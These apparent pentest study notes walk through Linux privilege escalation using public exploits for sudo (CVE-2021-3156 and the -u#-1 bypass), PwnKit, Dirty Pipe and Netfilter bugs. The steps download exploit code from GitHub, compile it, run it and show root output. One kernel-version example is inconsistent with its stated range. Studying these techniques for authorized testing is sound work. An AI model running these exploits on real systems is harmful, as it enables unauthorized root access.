# 🏃‍♂️ Recent 0-Days

## Sudo

&#x20;The `/etc/sudoers` file specifies which users or groups are allowed to run specific programs and with what privileges

```shell-session
cry0l1t3@nix02:~$ sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
```

One of the latest vulnerabilities for `sudo` carries the CVE-2021-3156 and is based on a heap-based buffer overflow vulnerability. This affected the sudo versions:

* 1.8.31 - Ubuntu 20.04
* 1.8.27 - Debian 10
* 1.9.2 - Fedora 33
* and others

To have te sudo version ->

```shell-session
sudo -V | head -n1
```

To test this out ->

```shell-session
cry0l1t3@nix02:~$ git clone https://github.com/blasty/CVE-2021-3156.git
cry0l1t3@nix02:~$ cd CVE-2021-3156
cry0l1t3@nix02:~$ make

#with the help command ->
  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------
```

find out which version of the operating system we are dealing with

```shell-session
cry0l1t3@nix02:~$ cat /etc/lsb-release

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
```

Now we specify the respective ID for the version operating system

```shell-session
cry0l1t3@nix02:~$ ./sudo-hax-me-a-sandwich 1
```

### Sudo Policy Bypass

Another vulnerability was found in 2019 that affected all versions below `1.8.28`, which allowed privileges to escalate even with a simple command. there is a prerequisite. It had to allow a user in the `/etc/sudoers` file to execute a specific command.

```shell-session
cry0l1t3@nix02:~$ sudo -l
[sudo] password for cry0l1t3: **********

User cry0l1t3 may run the following commands on Penny:
    ALL=(ALL) /usr/bin/id
```

`Sudo` also allows commands with specific user IDs to be executed, which executes the command with the user's privileges carrying the specified ID. The ID of the specific user can be read from the `/etc/passwd` file.

```shell-session
cry0l1t3@nix02:~$ cat /etc/passwd | grep cry0l1t3
cry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cr    y0l1t3:/bin/bash
```

Thus the ID for the user `cry0l1t3` would be `1005`. If a negative ID (`-1`) is entered at `sudo`, this results in processing the ID `0`, which only the `root` has.

```shell-session
cry0l1t3@nix02:~$ sudo -u#-1 id
root@nix02:/home/cry0l1t3#
```

## Polkit

PolicyKit (`polkit`) is an authorization service on Linux-based operating systems that allows user software and system components to communicate with each other if the user software is authorized to do so

Polkit works with two groups of files.

1. actions/policies (`/usr/share/polkit-1/actions`)
2. rules (`/usr/share/polkit-1/rules.d`)

Custom rules can be placed in the directory `/etc/polkit-1/localauthority/50-local.d` with the file extension `.pkla`.

PolKit also comes with three additional programs:

* `pkexec` - runs a program with the rights of another user or with root rights
* `pkaction` - can be used to display actions
* `pkcheck` - this can be used to check if a process is authorized for a specific action

`pkexec` performs the same task as `sudo` and can run a program with the rights of another user or root.

```shell-session
cry0l1t3@nix02:~$ # pkexec -u <user> <command>
cry0l1t3@nix02:~$ pkexec -u root id
```

To use the  memory corruption vulnerability with the identifier [CVE-2021-4034](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034)

```shell-session
cry0l1t3@nix02:~$ git clone https://github.com/arthepsy/CVE-2021-4034.git
cry0l1t3@nix02:~$ cd CVE-2021-4034
cry0l1t3@nix02:~$ gcc cve-2021-4034-poc.c -o poc
```

```shell-session
cry0l1t3@nix02:~$ ./poc
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Dirty Pipe

[Dirty Pipe](https://dirtypipe.cm4all.com/) ([CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847)), allows unauthorized writing to root user files on Linux. All kernels from version `5.8` to `5.17` are affected and vulnerable

this vulnerability allows a user to write to arbitrary files as long as he has read access to these files.

To exploit this vulnerability, we need to download a [PoC](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits) and compile it on the target system itself or a copy we have made.

```shell-session
cry0l1t3@nix02:~$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cry0l1t3@nix02:~$ cd CVE-2022-0847-DirtyPipe-Exploits
cry0l1t3@nix02:~$ bash compile.sh
```

There are  two different exploits available. The first exploit version (`exploit-1`) modifies the `/etc/passwd` and gives us a prompt with root privileges. We need to verify kernel version ->&#x20;

```shell-session
cry0l1t3@nix02:~$ uname -r
5.13.0-46-generic
```

```shell-session
cry0l1t3@nix02:~$ ./exploit-1
<SNIP>
id
uid=0(root) gid=0(root) groups=0(root)
```

And with  (`exploit-2`), we can execute SUID binaries with root privileges. However, before we can do that, we first need to find these SUID binaries.

```shell-session
cry0l1t3@nix02:~$ find / -perm -4000 2>/dev/null
```

Then we can choose a binary and specify the full path of the binary as an argument for the exploit and execute it.

```shell-session
cry0l1t3@nix02:~$ ./exploit-2 /usr/bin/sudo
# id
uid=0(root)
```

## Netfilter

`Netfilter` is a Linux kernel module that provides, among other things, packet filtering, network address translation, and other tools relevant to firewalls. It controls and regulates network traffic by manipulating individual packets based on their characteristics and rules.

When the module is activated, all IP packets are checked by the `Netfilter` before they are forwarded to the target application of the own or remote system. In 2021 ([CVE-2021-22555](https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555)), 2022 ([CVE-2022-1015](https://github.com/pqlx/CVE-2022-1015)), and also in 2023 ([CVE-2023-32233](https://github.com/Liuk3r/CVE-2023-32233)), several vulnerabilities were found that could lead to privilege escalation.

**CVE-2021-22555**

Vulnerable kernel versions: 2.6 - 5.11

```shell-session
cry0l1t3@ubuntu:~$ uname -r
5.10.5-051005-generic
```

```shell-session
cry0l1t3@ubuntu:~$ wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
cry0l1t3@ubuntu:~$ gcc -m32 -static exploit.c -o exploit
cry0l1t3@ubuntu:~$ ./exploit
```

**CVE-2022-25636**

Linux kernel 5.4 through 5.6.10, this exploit can grant root privileges to local users due to heap out-of-bounds write.

```shell-session
cry0l1t3@ubuntu:~$ uname -r
5.13.0-051300-generic
```

{% hint style="danger" %}
However, we need to be careful with this exploit as it can corrupt the kernel
{% endhint %}

```shell-session
cry0l1t3@ubuntu:~$ git clone https://github.com/Bonfee/CVE-2022-25636.git
cry0l1t3@ubuntu:~$ cd CVE-2022-25636
cry0l1t3@ubuntu:~$ make
cry0l1t3@ubuntu:~$ ./exploit
```

**CVE-2023-32233**

This vulnerability exploits the so called `anonymous sets` in `nf_tables` by using the `Use-After-Free` vulnerability in the Linux Kernel up to version `6.3.1`

```shell-session
cry0l1t3@ubuntu:~$ git clone https://github.com/Liuk3r/CVE-2023-32233
cry0l1t3@ubuntu:~$ cd CVE-2023-32233
cry0l1t3@ubuntu:~/CVE-2023-32233$ gcc -Wall -o exploit exploit.c -lmnl -lnftnl
cry0l1t3@ubuntu:~/CVE-2023-32233$ ./exploit

```
